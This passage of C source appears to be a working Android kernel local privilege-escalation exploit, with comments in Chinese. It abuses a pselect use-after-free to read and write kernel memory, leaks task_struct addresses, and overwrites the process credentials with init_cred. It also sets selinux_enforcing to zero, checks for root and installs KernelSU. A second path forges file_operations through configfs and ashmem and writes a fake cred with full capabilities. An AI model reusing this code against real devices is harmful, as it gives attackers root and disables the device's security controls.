    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock || !fake_w0 || !fake_task) _exit(12);

    uintptr_t heap_page = page_base;
    uintptr_t heap_lock = fake_lock;
    uintptr_t heap_w0 = fake_w0;
    uintptr_t heap_task = fake_task;

    if (!prepare_skb_payload(page_base, PAGE_PAYLOAD_FOPS) ||
        page_base != heap_page || fake_lock != heap_lock ||
        fake_w0 != heap_w0 || fake_task != heap_task) {
      _exit(13);
    }

    pr_success("direct-w64[%d] target=%016zx value=%016zx shape=%d "
               "workspace=%016zx\n",
               idx, target, value, shape, page_base);
    run_main_route_threads();

    int triggered = atomic_load(&route_done) &&
                    atomic_load(&consumer_calls) > 0 &&
                    atomic_load(&consumer_success) > 0;
    if (triggered && followup_target) {
      uintptr_t followup_value = page_base + 0x100;
      int followup_ok = 0;
      for (int attempt = 0; attempt < 3; attempt++) {
        if (direct_pselect_write_once_internal(
                followup_target, followup_value, 1,
                followup_idx + attempt, 0, 0)) {
          followup_ok = 1;
          break;
        }
      }
      _exit(followup_ok ? 0 : 15);
    }
    _exit(triggered ? 0 : 16);
  }

  if (setpgid(child, child) != 0 && errno != EACCES && errno != ESRCH) {
    pr_warning("direct-w64[%d] parent setpgid failed child=%d errno=%d\n",
               idx, child, errno);
  }

  uint64_t deadline = monotonic_ms() + (uint64_t)DIRECT_WRITE_TIMEOUT_SEC * 1000;
  int status = 0;
  for (;;) {
    pid_t got = waitpid(child, &status, WNOHANG);
    if (got == child) break;
    if (got < 0) {
      if (errno == EINTR) continue;
      kill_and_reap_group(child);
      return 0;
    }
    if (monotonic_ms() >= deadline) {
      pr_warning("direct-w64[%d] timeout child=%d seconds=%d\n",
                 idx, child, DIRECT_WRITE_TIMEOUT_SEC);
      kill_and_reap_group(child);
      errno = ETIMEDOUT;
      return 0;
    }
    usleep(10000);
  }

  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
    pr_warning("direct-w64[%d] child=%d status=0x%x\n", idx, child, status);
    return 0;
  }
  return 1;
}

static int direct_pselect_write_once(
    uintptr_t target, uintptr_t value, int shape, int idx) {
  return direct_pselect_write_once_internal(target, value, shape, idx, 0, 0);
}

static int direct_trigger_write64(
    const char *name, uintptr_t target, uintptr_t value,
    int shape, int *write_idx) {
  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
    int idx = (*write_idx)++;
    pr_success("direct-step %s attempt=%d/%d target=%016zx value=%016zx\n",
               name, attempt, DIRECT_WRITE_ATTEMPTS, target, value);
    if (direct_pselect_write_once(target, value, shape, idx)) {
      return 1;
    }
  }
  return 0;
}

static int direct_trigger_write64_followup(
    const char *name, uintptr_t target, uintptr_t value, int shape,
    uintptr_t followup_target, int *write_idx) {
  int idx = (*write_idx)++;
  int followup_idx = *write_idx;
  *write_idx += DIRECT_WRITE_ATTEMPTS;
  pr_success("direct-step %s target=%016zx value=%016zx followup=%016zx\n",
             name, target, value, followup_target);
  return direct_pselect_write_once_internal(
      target, value, shape, idx, followup_target, followup_idx);
}

/*
 * direct_read_boot_id_raw: 读取 /proc/sys/kernel/random/boot_id 的原始16字节
 */
static int direct_read_boot_id_raw(unsigned char raw[16]) {
  memset(raw, 0, 16);
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("direct boot_id open failed errno=%d\n", errno);
    return 0;
  }
  char buf[64] = {0};
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    pr_warning("direct boot_id read failed ret=%zd errno=%d\n", n, errno);
    return 0;
  }
  buf[n] = 0;
  /* 解析 UUID 格式: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
   * 提取前16字节的 hex 值 */
  int out = 0;
  for (int i = 0; buf[i] && out < 16; i++) {
    char c = buf[i];
    if (c == '-' || c == '\n') continue;
    int v = -1;
    if (c >= '0' && c <= '9') v = c - '0';
    else if (c >= 'a' && c <= 'f') v = c - 'a' + 10;
    else if (c >= 'A' && c <= 'F') v = c - 'A' + 10;
    if (v < 0) continue;
    if (out % 2 == 0)
      raw[out / 2] = (unsigned char)(v << 4);
    else
      raw[out / 2] |= (unsigned char)v;
    out++;
  }
  return out >= 32;  /* 需要完整的32个hex字符(16字节) */
}

/*
 * direct_read_shape0_exact64_once: 通过 boot_id sidecar 读取内核地址
 *
 * 机制:
 *   1. direct_pselect_write_once(boot_id_data, target_addr, shape=0)
 *   2. 读取 /proc/sys/kernel/random/boot_id
 *   3. 验证 sidecar 值确认读取成功
 *
 * shape=0 的 fd_set 布局:
 *   parent = boot_id_data (SLIDE_RANDOM_BOOT_ID_DATA)
 *   right = 0
 *   left = target_addr
 *
 * rb_insert_color 写入 parent 到 waiter.__rb_parent_color → boot_id 数据被覆写
 * 读取 /proc/sys/kernel/random/boot_id → 获取 target_addr 处的值
 */
#define DIRECT_R64_FATAL  -1
#define DIRECT_R64_RETRY   0
#define DIRECT_R64_OK      1

static int direct_read_shape0_exact64_once(
    uintptr_t q, uint64_t *value, const char *name,
    int attempt, int *write_idx) {
  const uintptr_t b = SLIDE_RANDOM_BOOT_ID_DATA;

  if (!value || !write_idx || !is_direct_ptr(b) || !is_kernel_ptr(q) ||
      (b & 7) != 0 || (q & 7) != 0 || q > UINTPTR_MAX - 16) {
    pr_error("direct-r64-fatal name=%s phase=precheck attempt=%d "
             "reason=bad-address B=%016zx Q=%016zx\n",
             name, attempt, b, q);
    return DIRECT_R64_FATAL;
  }

  int idx = (*write_idx)++;

  pr_success("direct-r64-plan name=%s attempt=%d/%d idx=%d shape=0 "
             "B=%016zx Q=%016zx Q8=%016zx\n",
             name, attempt, DIRECT_WRITE_ATTEMPTS, idx, b, q, q + 8);

  if (!direct_pselect_write_once(b, q, 0, idx)) {
    pr_warning("direct-r64-retry name=%s attempt=%d idx=%d\n",
               name, attempt, idx);
    return DIRECT_R64_RETRY;
  }

  unsigned char raw[16] = {0};
  if (!direct_read_boot_id_raw(raw)) {
    pr_error("direct-r64-fatal name=%s phase=proc-read attempt=%d\n",
             name, attempt);
    return DIRECT_R64_FATAL;
  }

  uint64_t got = 0;
  uint64_t sidecar = 0;
  memcpy(&got, raw, sizeof(got));
  memcpy(&sidecar, raw + 8, sizeof(sidecar));
  unsigned int expected_raw8 = (unsigned int)(b & 0xff);
  int oracle_ok = sidecar == (uint64_t)b && raw[8] == expected_raw8;

  pr_success("direct-r64-oracle name=%s attempt=%d idx=%d "
             "value=%016llx sidecar=%016llx expected_sidecar=%016zx "
             "raw8=%02x expected_raw8=%02x ok=%d\n",
             name, attempt, idx,
             (unsigned long long)got, (unsigned long long)sidecar, b,
             (unsigned int)raw[8], expected_raw8, oracle_ok);

  if (!oracle_ok) {
    pr_error("direct-r64-fatal name=%s phase=oracle attempt=%d "
             "reason=shape0-poststate-mismatch\n", name, attempt);
    return DIRECT_R64_FATAL;
  }

  *value = got;
  return DIRECT_R64_OK;
}

/*
 * direct_cred_replace: Linuxoid-cn 方式 — 直接用 pselect write 替换 cred
 *
 * 不依赖 fops hijack / configfs R/W / pipe physrw。
 * 每次写入 fork 子进程准备新内核页，触发新的 UAF + PI chain walk。
 *
 * 流程:
 *   1. 泄漏 per_cpu_offset → entry_task → task_struct
 *   2. 写 init_cred → task->real_cred
 *   3. 写 init_cred → task->cred
 *   4. 写 0 → selinux_enforcing
 *   5. fork 子进程验证 uid=0
 */
static int direct_read_enforcing(void) {
  char value[16];
  memset(value, 0, sizeof(value));
  int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (fd < 0) return -1;
  ssize_t n = read(fd, value, sizeof(value) - 1);
  close(fd);
  if (n <= 0) return -1;
  value[n] = 0;
  if (value[0] == '0' && (value[1] == 0 || value[1] == '\n')) return 0;
  if (value[0] == '1' && (value[1] == 0 || value[1] == '\n')) return 1;
  return -1;
}

int direct_cred_replace(void) {
  int write_idx = 0;

  fops_route_log("DIRECT_CRED_ENTER: pid=%d uid=%d kaslr=%d base=%016llx\n",
                 getpid(), getuid(), kaslr_done,
                 (unsigned long long)kaslr_base);
  if (!kaslr_done) {
    fops_route_log("DIRECT_CRED_FAIL: no KASLR base\n");
    return 0;
  }

  /* 步骤 1: 泄漏 per_cpu_offset */
  uintptr_t percpu_slot = data_addr(PER_CPU_OFFSET);
  uint64_t percpu_delta = 0;
  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
    int rr = direct_read_shape0_exact64_once(
        percpu_slot, &percpu_delta, "per_cpu_offset", attempt, &write_idx);
    if (rr == DIRECT_R64_OK) break;
    if (rr == DIRECT_R64_FATAL || attempt == DIRECT_WRITE_ATTEMPTS) {
      fops_route_log("DIRECT_CRED_FAIL: per_cpu_offset leak failed\n");
      return 0;
    }
  }
  fops_route_log("DIRECT_PERCPU: delta=%016llx slot=%016llx\n",
                 (unsigned long long)percpu_delta,
                 (unsigned long long)percpu_slot);

  /* 步骤 2: 泄漏 entry_task (当前 CPU 的 task_struct 指针) */
  uintptr_t entry_slot = data_addr(ENTRY_TASK) + (uintptr_t)percpu_delta;
  if (!is_kernel_ptr(entry_slot) || (entry_slot & 7) != 0) {
    fops_route_log("DIRECT_CRED_FAIL: bad entry_slot=%016llx\n",
                   (unsigned long long)entry_slot);
    return 0;
  }
  uint64_t task = 0;
  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
    int rr = direct_read_shape0_exact64_once(
        entry_slot, &task, "entry_task", attempt, &write_idx);
    if (rr == DIRECT_R64_OK) break;
    if (rr == DIRECT_R64_FATAL || attempt == DIRECT_WRITE_ATTEMPTS) {
      fops_route_log("DIRECT_CRED_FAIL: entry_task leak failed\n");
      return 0;
    }
  }
  if (!is_kernel_ptr(task)) {
    fops_route_log("DIRECT_CRED_FAIL: bad task=%016llx\n",
                   (unsigned long long)task);
    return 0;
  }
  fops_route_log("DIRECT_TASK: task=%016llx\n", (unsigned long long)task);

  /* 步骤 3: 写 init_cred → task->real_cred 和 task->cred */
  uintptr_t init_cred = text_addr(INIT_CRED);
  uintptr_t real_cred_slot = (uintptr_t)task + TASK_REAL_CRED_OFF;
  uintptr_t cred_slot = (uintptr_t)task + TASK_CRED_OFF;

  fops_route_log("DIRECT_WRITE: real_cred=%016llx cred=%016llx init_cred=%016llx\n",
                 (unsigned long long)real_cred_slot,
                 (unsigned long long)cred_slot,
                 (unsigned long long)init_cred);

  if (!direct_trigger_write64(
          "install_real_cred", real_cred_slot, init_cred, 1, &write_idx)) {
    fops_route_log("DIRECT_CRED_FAIL: real_cred write failed\n");
    return 0;
  }
  fops_route_log("DIRECT_REAL_CRED: OK\n");

  /* 步骤 4: 写 init_cred → task->cred, 同时 followup 写 0 → selinux_enforcing */
  uintptr_t selinux_addr = text_addr(SELINUX_ENFORCING);
  if (!direct_trigger_write64_followup(
          "install_cred_then_selinux_zero", cred_slot, init_cred, 1,
          selinux_addr, &write_idx)) {
    fops_route_log("DIRECT_CRED_FAIL: cred write failed\n");
    return 0;
  }
  fops_route_log("DIRECT_CRED: OK\n");

  /* 步骤 5: fork 子进程验证 uid=0 */
  pid_t verify = fork();
  if (verify == 0) {
    uid_t uid = getuid();
    uid_t euid = geteuid();
    fops_route_log("DIRECT_VERIFY: uid=%u euid=%u\n", uid, euid);
    if (uid == 0 && euid == 0) {
      install_kernelsu_late_load();
      _exit(0);
    }
    _exit(1);
  }
  int vs = 0;
  waitpid(verify, &vs, 0);
  int ok = WIFEXITED(vs) && WEXITSTATUS(vs) == 0;

  fops_route_log("DIRECT_CRED_RESULT: ok=%d\n", ok);
  if (ok) {
    root_child_done = 1;
    root_uid_after = 0;
    cfi_last_step = 0;
    cfi_last_errno = 0;
  }
  return ok;
}

int install_child_root(int fd) {
  root_stage_entered = 0;
  root_stage_ok = 0;
  int transport_ok = install_pipe_physrw(fd);
  root_stage_transport_ok = transport_ok;
  if (!transport_ok) {
    pr_info("ROOT_STAGE_TRANSPORT_FAIL cache=%d read=%d write=%d read64=%d write64=%d\n",
            pipe_cache_gate_ok, physrw_read_ok, physrw_write_ok,
            physrw_read64_ok, physrw_write64_ok);
    return 0;
  }
  return root_stage(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    fops_route_log("CFI_OPEN_ASHMEM_FAIL: errno=%d path=%s attempt=%d\n",
                   cfi_last_errno, ashmem_path, cfi_attempts);
    return 0;
  }

  uintptr_t misc_fops_slot = data_addr(ASHMEM_MISC) + 0x10;
  fops_before = 0;
  pr_info("cfi stage entered fd=%d path=%s fake_fops=%016zx "
          "binwrite_target=%016zx misc_fops_slot=%016zx\n",
          fd, ashmem_path, fake_fops, binwrite_target, misc_fops_slot);

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    /* fops hijack 失败 (errno=22) — 尝试 direct cred 替换路径
     * (Linuxoid-cn approach: 不依赖 fops hijack, 直接写 cred) */
    cfi_last_step = 1;
    cfi_last_errno = errno;
    SYSCHK(close(fd));
    return direct_cred_replace();
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, fake_fops + FOPS_LLSEEK_OFF,
                                  &before, sizeof(before));
  fops_before = before;
  pr_info("cfi fake_fops llseek read ret=%zd value=%016llx errno=%d\n",
          rb, (unsigned long long)before, errno);
  if (rb != (ssize_t)sizeof(before) || before != text_addr(NOOP_LLSEEK)) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

#if CFI_CONFIGFS_ONLY_DIAG
  /* The route, configfs transport, readback, and forged fops layout have all
   * been observed.  Deliberately stop before leak_kernel_base(), pipe-cache
   * shaping, physrw installation, and any callback-facing operation. */
  uint64_t null_owner_diag = 0;
  cfi_owner_ret = configfs_write_once(fd, fake_fops, &null_owner_diag,
                                      sizeof(null_owner_diag));
  cfi_restore_ret = 0;
  cfi_last_step = cfi_owner_ret == (ssize_t)sizeof(null_owner_diag) ? 0 : 6;
  cfi_last_errno = cfi_last_step ? errno : 0;
  pr_info("CFI_CONFIGFS_ONLY_STOP: write=%zd read=%zd llseek=%016llx "
          "owner_clear=%zd errno=%d\n",
          cfi_write_ret, cfi_read_ret, (unsigned long long)before,
          cfi_owner_ret, cfi_last_errno);
  SYSCHK(close(fd));
  return cfi_last_step == 0;
#endif

  /* Do not call restore_slide_boot_id() here.  On violin, sysctl_bootid is
   * the boot-id data buffer, not a ctl_table with a .data pointer; the old
   * bootid restoration gate is therefore invalid for this target. */

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  /* Stage 2 has already been completed by root_stage(): it is intentionally
   * gated on a proved pipe physrw transport and verifies the root child.  The
   * block below is retained only as an opt-in historical experiment; running
   * it by default would replace a valid cred with a partial object whose
   * user_ns/secure state is zeroed. */
  fops_route_log("STAGE2_ROOT_STAGE: entered=%d transport=%d ok=%d child=%d\n",
                 root_stage_entered, root_stage_transport_ok, root_stage_ok,
                 root_child_done);

  /* KernelSU late-load: root 成功后安装并运行 ksud late-load */
  if (root_stage_ok && root_child_done) {
    int ksu_ok = install_kernelsu_late_load();
    fops_route_log("STAGE2_KSU_LATE_LOAD: ok=%d\n", ksu_ok);
  }

#if LEGACY_CONFIGFS_CRED_STAGE
  pr_info("stage2 legacy configfs cred path enabled\n");

  /* 使用 KernelSnitch 泄漏的 mm_struct 地址 */
  uint64_t mm_addr = leaked_mm_struct;
  if (!is_kernel_ptr(mm_addr)) {
    fops_route_log("STAGE2_MM_FAIL: leaked_mm_struct=%016llx\n",
                   (unsigned long long)mm_addr);
    cfi_last_step = 12;
    cfi_last_errno = 0;
    goto fail;
  }
  fops_route_log("STAGE2_MM_LEAK: mm_struct=%016llx\n", (unsigned long long)mm_addr);

  /* 从 mm_struct 读取 owner (task_struct) */
  uint64_t task_struct = kernel_read64(fd, mm_addr + MM_OWNER_OFF);
  if (!is_kernel_ptr(task_struct)) {
    fops_route_log("STAGE2_TASK_FAIL: mm=%016llx owner=%016llx\n",
                   (unsigned long long)mm_addr, (unsigned long long)task_struct);
    cfi_last_step = 13;
    cfi_last_errno = errno;
    goto fail;
  }
  fops_route_log("STAGE2_TASK: task_struct=%016llx\n", (unsigned long long)task_struct);

  /* 读取当前 cred 以验证地址正确 */
  uint64_t old_real_cred = kernel_read64(fd, task_struct + TASK_REAL_CRED_OFF);
  uint64_t old_cred = kernel_read64(fd, task_struct + TASK_CRED_OFF);
  fops_route_log("STAGE2_OLD_CRED: real_cred=%016llx cred=%016llx\n",
                 (unsigned long long)old_real_cred, (unsigned long long)old_cred);

  /* 创建 fake_cred: uid=gid=0, cap_full, secbits=0
   * CRED_SECURITY_OFF=128, 需要至少17个uint64_t */
  uintptr_t fake_cred_addr = page_base + SCRATCH_OFF + 0x80;
  uint64_t fake_cred_data[17];  /* 136 bytes, 覆盖到 CRED_SECURITY_OFF+8 */
  memset(fake_cred_data, 0, sizeof(fake_cred_data));
  /* uid=0, gid=0, suid=0, egid=0 */
  fake_cred_data[CRED_UID_OFF / 8] = 0;
  /* securebits = 0 */
  fake_cred_data[CRED_SECUREBITS_OFF / 8] = 0;
  /* capabilities: all caps full (0xff...) */
  for (int i = CRED_CAPS_OFF / 8; i < (CRED_CAPS_OFF + 24) / 8; i++) {
    fake_cred_data[i] = ~0ULL;
  }
  /* security = NULL (disable SELinux) */
  fake_cred_data[CRED_SECURITY_OFF / 8] = 0;

  /* 写 fake_cred 到内核页 */
  ssize_t cred_wr = kernel_write_data(fd, fake_cred_addr, fake_cred_data, sizeof(fake_cred_data));
  fops_route_log("STAGE2_FAKE_CRED: wr=%zd target=%016llx\n",
                 cred_wr, (unsigned long long)fake_cred_addr);
  if (cred_wr != (ssize_t)sizeof(fake_cred_data)) {
    cfi_last_step = 14;
    cfi_last_errno = errno;
    goto fail;
  }

  /* 读取 old cred 的 refcount，fake_cred 需要匹配 */
  uint64_t old_cred_refcount = kernel_read64(fd, old_cred);
  /* 创建新的 cred 内容：复制原 cred 但改 uid/gid 为 0 */
  uint64_t new_cred[17];
  memset(new_cred, 0, sizeof(new_cred));
  new_cred[0] = old_cred_refcount;  /* refcount = 原值 */
  /* uid/gid 字段在偏移 8-40，全设为 0 */
  new_cred[CRED_UID_OFF / 8] = 0;
  /* capabilities 全满 */
  for (int i = CRED_CAPS_OFF / 8; i < (CRED_CAPS_OFF + 24) / 8; i++) {
    new_cred[i] = ~0ULL;
  }
  /* security = NULL */
  new_cred[CRED_SECURITY_OFF / 8] = 0;

  /* 写新 cred */
  cred_wr = kernel_write_data(fd, fake_cred_addr, new_cred, sizeof(new_cred));
  fops_route_log("STAGE2_NEW_CRED: wr=%zd refcount=%016llx\n",
                 cred_wr, (unsigned long long)old_cred_refcount);

  /* 写入 task->real_cred 和 task->cred */
  ssize_t rc_wr = kernel_write_data(fd, task_struct + TASK_REAL_CRED_OFF,
                                    &fake_cred_addr, sizeof(fake_cred_addr));
  ssize_t c_wr = kernel_write_data(fd, task_struct + TASK_CRED_OFF,
                                   &fake_cred_addr, sizeof(fake_cred_addr));
  fops_route_log("STAGE2_WRITE: real_cred wr=%zd cred wr=%zd\n", rc_wr, c_wr);

  /* 写入 selinux_enforcing = 0 */
  uint32_t zero = 0;
  uintptr_t enforcing_addr = text_addr(SELINUX_ENFORCING);
  ssize_t se_wr = kernel_write_data(fd, enforcing_addr, &zero, sizeof(zero));
  fops_route_log("STAGE2_SELINUX: wr=%zd enforcing=%016llx\n",
                 se_wr, (unsigned long long)enforcing_addr);

  /* 验证写入 */
  uint64_t verify_real_cred = kernel_read64(fd, task_struct + TASK_REAL_CRED_OFF);
  uint64_t verify_cred = kernel_read64(fd, task_struct + TASK_CRED_OFF);
  uint64_t verify_uid = kernel_read64(fd, verify_real_cred + CRED_UID_OFF);
  fops_route_log("STAGE2_VERIFY: real_cred=%016llx cred=%016llx uid=%016llx\n",
                 (unsigned long long)verify_real_cred,
                 (unsigned long long)verify_cred,
                 (unsigned long long)verify_uid);

  if (verify_real_cred == fake_cred_addr && verify_uid == 0) {
    fops_route_log("STAGE2_SUCCESS: uid=0, root achieved!\n");
    pr_info("STAGE2 SUCCESS: uid=0, root achieved!\n");
  }
#else
  pr_info("stage2: root_stage complete; legacy configfs cred path disabled\n");
#endif

  /* 不恢复 misc_fops: violin 上它是静态 file_operations */
  cfi_restore_ret = 0;
  fops_after = 0;

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    /* Do not write to misc_fops here: on violin misc_fops is a static
     * struct file_operations, not a pointer slot.  The active fd is already
     * routed through the forged fops; only clear fake_fops->owner below. */
    cfi_restore_ret = 0;
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
